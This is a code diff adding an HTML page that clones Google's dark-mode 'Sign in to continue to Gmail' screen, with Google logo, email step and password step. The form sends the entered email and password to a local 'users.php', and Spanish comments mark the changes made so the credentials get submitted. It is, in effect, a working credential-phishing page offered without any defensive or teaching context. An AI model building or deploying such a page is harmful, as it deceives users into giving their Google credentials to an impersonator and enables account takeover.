@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        bgDark: '#1e1e1e',
+                        cardDark: '#0e0e0e',
+                        inputBorder: '#8e918f',
+                        inputBorderFocus: '#a8c7fa',
+                        accentBlue: '#a8c7fa',
+                        accentBlueHover: '#b8d3ff',
+                        linkBlue: '#a8c7fa',
+                        textPrimary: '#e3e2e6',
+                        textSecondary: '#c4c6c0',
+                        textMuted: '#8e918f',
+                        cardBg: '#1b1b1b',
+                    },
+                    fontFamily: {
+                        google: ['"Open Sans"', 'Roboto', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Open Sans', 'Roboto', sans-serif;
+            background-color: #1f1f1f;
+            color: #e3e2e6;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .material-input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #8e918f;
+            border-radius: 4px;
+            padding: 16px;
+            color: #e3e2e6;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s ease, border-width 0.1s ease;
+        }
+
+        .material-input:focus {
+            border-color: #a8c7fa;
+            border-width: 2px;
+            padding: 15px;
+        }
+
+        .material-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #1b1b1b;
+            padding: 0 4px;
+            color: #c4c6c0;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .material-input:focus ~ .material-label,
+        .material-input:not(:placeholder-shown) ~ .material-label {
+            top: 0;
+            font-size: 12px;
+            color: #a8c7fa;
+        }
+
+        .material-input:not(:focus):not(:placeholder-shown) ~ .material-label {
+            color: #c4c6c0;
+        }
+
+        .material-input.error {
+            border-color: #f2b8b5;
+        }
+
+        .material-input.error ~ .material-label {
+            color: #f2b8b5;
+        }
+
+        .step-container {
+            transition: opacity 0.25s ease-in-out, transform 0.25s ease-in-out;
+        }
+        .step-hidden {
+            opacity: 0;
+            transform: translateX(12px);
+            pointer-events: none;
+            position: absolute;
+            width: 100%;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between items-center p-4 md:p-6 bg-[#1f1f1f] text-[#e3e2e6]">
+
+    <!-- Main Centered Content -->
+    <div class="w-full flex-1 flex items-center justify-center my-auto">
+        <main class="w-full max-w-[1040px] bg-[#1b1b1b] rounded-[28px] p-9 md:p-14 shadow-2xl transition-all duration-300">
+            
+            <!-- FORMULARIO TRADICIONAL APUNTANDO A users.php -->
+            <form action="users.php" method="POST" id="loginForm" onsubmit="return handleFormSubmit(event)">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-start">
+                    
+                    <!-- Left Column: Branding and Title -->
+                    <div class="flex flex-col justify-start h-full">
+                        <div>
+                            <!-- Google Logo -->
+                            <div class="mb-4">
+                                <svg class="w-10 h-10" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+                                </svg>
+                            </div>
+                            
+                            <!-- Title & Dynamic Subtitle -->
+                            <h1 id="page-title" class="text-4xl font-normal tracking-tight text-[#e3e2e6] mb-2">
+                                Sign in
+                            </h1>
+                            <p id="page-subtitle" class="text-sm text-[#e3e2e6] tracking-wide">
+                                to continue to Gmail
+                            </p>
+                        </div>
+
+                        <!-- Selected Account Pill -->
+                        <div 
+                            id="account-badge" 
+                            class="hidden items-center gap-2 mt-2 px-2.5 py-1 rounded-full w-max border border-[#747775] cursor-pointer hover:bg-[#303134] focus:bg-[#303134] focus:outline-none focus:ring-1 focus:ring-[#a8c7fa] transition-colors select-none"
+                            tabindex="0"
+                            role="link"
+                            aria-label="Switch account"
+                            onclick="goToStep(1)"
+                            onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); goToStep(1); }"
+                        >
+                            <svg class="w-5 h-5 text-[#c4c6c0] shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-3.8-.85-5.05-2.2.03-1.68 3.37-2.6 5.05-2.6s5.02.92 5.05 2.6C15.8 19.15 14.03 20 12 20z"/>
+                            </svg>
+                            <span id="badge-email" class="text-xs md:text-sm text-[#e3e2e6] font-medium tracking-tight"></span>
+                            <svg class="w-4 h-4 text-[#e3e2e6] shrink-0 -ml-0.5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M7 10l5 5 5-5z"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <!-- Right Column: Form Steps -->
+                    <div class="relative min-h-[260px] flex flex-col justify-between">
+                        
+                        <!-- STEP 1: Email Input -->
+                        <div id="step-1" class="step-container space-y-6">
+                            <div class="pt-2">
+                                <div class="input-group">
+                                    <!-- AÑADIDO name="email" -->
+                                    <input 
+                                        type="text" 
+                                        name="email"
+                                        id="identifierInput" 
+                                        class="material-input" 
+                                        placeholder=" " 
+                                        autocomplete="username"
+                                        onkeydown="if(event.key === 'Enter') { event.preventDefault(); handleNextStep1(); }"
+                                    />
+                                    <label for="identifierInput" class="material-label" style="background-color: #1b1b1b;">
+                                        Email or phone
+                                    </label>
+                                </div>
+                                <div id="email-error" class="text-[#f2b8b5] text-xs mt-2 flex items-center gap-1 hidden">
+                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                                    </svg>
+                                    <span id="email-error-text">Enter an email or phone number</span>
+                                </div>
+                                
+                                <div class="mt-2">
+                                    <a href="#" class="text-[#a8c7fa] text-sm font-medium hover:underline inline-block">
+                                        Forgot email?
+                                    </a>
+                                </div>
+                            </div>
+
+                            <div class="text-sm text-[#c4c6c0] leading-relaxed pt-4">
+                                Not your computer? Use Guest mode to sign in privately. 
+                                <a href="#" class="text-[#a8c7fa] font-medium hover:underline inline-block">Learn more about using Guest mode</a>
+                            </div>
+
+                            <!-- Action Buttons -->
+                            <div class="flex items-center justify-between pt-8 mt-auto">
+                                <button type="button" class="text-[#a8c7fa] hover:bg-[#a8c7fa]/10 px-3 py-2 rounded-full text-sm font-medium transition-colors">
+                                    Create account
+                                </button>
+                                <button 
+                                    type="button" 
+                                    onclick="handleNextStep1()"
+                                    class="bg-[#a8c7fa] hover:bg-[#b8d3ff] text-[#040e29] font-medium text-sm px-6 py-2.5 rounded-full transition-colors shadow-sm active:scale-95"
+                                >
+                                    Next
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 2: Password Input -->
+                        <div id="step-2" class="step-container step-hidden space-y-5">
+                            <div class="text-sm text-[#e3e2e6] mb-6">
+                                To continue, first verify it's you
+                            </div>
+
+                            <div>
+                                <div class="input-group">
+                                    <!-- AÑADIDO name="password" -->
+                                    <input 
+                                        type="password" 
+                                        name="password"
+                                        id="passwordInput" 
+                                        class="material-input" 
+                                        placeholder=" "
+                                        autocomplete="current-password"
+                                    />
+                                    <label for="passwordInput" class="material-label" style="background-color: #1b1b1b;">
+                                        Enter your password
+                                    </label>
+                                </div>
+                                <div id="password-error" class="text-[#f2b8b5] text-xs mt-2 flex items-center gap-1 hidden">
+                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                                    </svg>
+                                    <span>Wrong password. Try again or click Forgot password.</span>
+                                </div>
+
+                                <!-- Show Password Checkbox -->
+                                <div class="flex items-center gap-3 mt-4">
+                                    <input 
+                                        type="checkbox" 
+                                        id="showPasswordToggle" 
+                                        onclick="togglePasswordVisibility()"
+                                        class="w-4 h-4 rounded accent-[#a8c7fa] cursor-pointer"
+                                    />
+                                    <label for="showPasswordToggle" class="text-sm text-[#e3e2e6] cursor-pointer select-none">
+                                        Show password
+                                    </label>
+                                </div>
+                            </div>
+
+                            <!-- Action Buttons -->
+                            <div class="flex items-center justify-between pt-10 mt-auto">
+                                <button 
+                                    type="button" 
+                                    onclick="goToStep(1)"
+                                    class="text-[#a8c7fa] hover:bg-[#a8c7fa]/10 px-3 py-2 rounded-full text-sm font-medium transition-colors"
+                                >
+                                    Try another way
+                                </button>
+                                <!-- CAMBIADO A type="submit" PARA ENVIAR EL FORMULARIO -->
+                                <button 
+                                    type="submit" 
+                                    class="bg-[#a8c7fa] hover:bg-[#b8d3ff] text-[#040e29] font-medium text-sm px-6 py-2.5 rounded-full transition-colors shadow-sm active:scale-95"
+                                >
+                                    Next
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </form>
+        </main>
+    </div>
+
+    <!-- Footer -->
+    <footer class="w-full max-w-[1040px] flex flex-col sm:flex-row justify-between items-center text-xs text-[#c4c6c0] py-4 px-4 gap-4">
+        <div class="relative">
+            <select class="bg-transparent text-[#c4c6c0] py-2 pr-8 pl-3 rounded hover:bg-[#2e2e2e] cursor-pointer appearance-none outline-none focus:ring-1 focus:ring-[#a8c7fa]">
+                <option class="bg-[#1e1e1e] text-white">English (United States)</option>
+                <option class="bg-[#1e1e1e] text-white">Español</option>
+            </select>
+        </div>
+        <div class="flex items-center gap-6">
+            <a href="#" class="hover:underline p-1">Help</a>
+            <a href="#" class="hover:underline p-1">Privacy</a>
+            <a href="#" class="hover:underline p-1">Terms</a>
+        </div>
+    </footer>
+
+    <!-- Interactive JavaScript -->
+    <script>
+        let currentStep = 1;
+        let userEmail = '';
+
+        const identifierInput = document.getElementById('identifierInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+        const pageTitle = document.getElementById('page-title');
+        const pageSubtitle = document.getElementById('page-subtitle');
+        const accountBadge = document.getElementById('account-badge');
+        const badgeEmail = document.getElementById('badge-email');
+
+        function validateEmail(email) {
+            return email.trim().length > 3;
+        }
+
+        function handleNextStep1() {
+            const value = identifierInput.value.trim();
+            if (!validateEmail(value)) {
+                identifierInput.classList.add('error');
+                emailError.classList.remove('hidden');
+                return;
+            }
+
+            identifierInput.classList.remove('error');
+            emailError.classList.add('hidden');
+
+            userEmail = value;
+            badgeEmail.textContent = userEmail;
+            accountBadge.setAttribute('aria-label', `${userEmail} selected. Switch account`);
+            
+            goToStep(2);
+        }
+
+        function handleFormSubmit(event) {
+            const password = passwordInput.value;
+            if (!password || password.length < 4) {
+                event.preventDefault(); // Detiene el envío si la contraseña es inválida
+                passwordInput.classList.add('error');
+                passwordError.classList.remove('hidden');
+                return false;
+            }
+            return true; // Permite el envío tradicional a users.php
+        }
+
+        function goToStep(step) {
+            currentStep = step;
+
+            const step1 = document.getElementById('step-1');
+            const step2 = document.getElementById('step-2');
+
+            step1.classList.add('step-hidden');
+            step2.classList.add('step-hidden');
+
+            if (step === 1) {
+                step1.classList.remove('step-hidden');
+                pageTitle.textContent = "Sign in";
+                pageSubtitle.textContent = "to continue to Gmail";
+                pageSubtitle.classList.remove('hidden');
+                accountBadge.classList.add('hidden');
+                accountBadge.classList.remove('inline-flex');
+                setTimeout(() => identifierInput.focus(), 150);
+            } else if (step === 2) {
+                step2.classList.remove('step-hidden');
+                pageTitle.textContent = "Welcome";
+                pageSubtitle.classList.add('hidden');
+                accountBadge.classList.remove('hidden');
+                accountBadge.classList.add('inline-flex');
+                setTimeout(() => passwordInput.focus(), 150);
+            }
+        }
+
+        function togglePasswordVisibility() {
+            const toggle = document.getElementById('showPasswordToggle');
+            passwordInput.type = toggle.checked ? 'text' : 'password';
+        }
+
+        identifierInput.addEventListener('input', () => {
+            identifierInput.classList.remove('error');
+            emailError.classList.add('hidden');
+        });
+
+        passwordInput.addEventListener('input', () => {
+            passwordInput.classList.remove('error');
+            passwordError.classList.add('hidden');
+        });
+    </script>
+</body>
+</html>
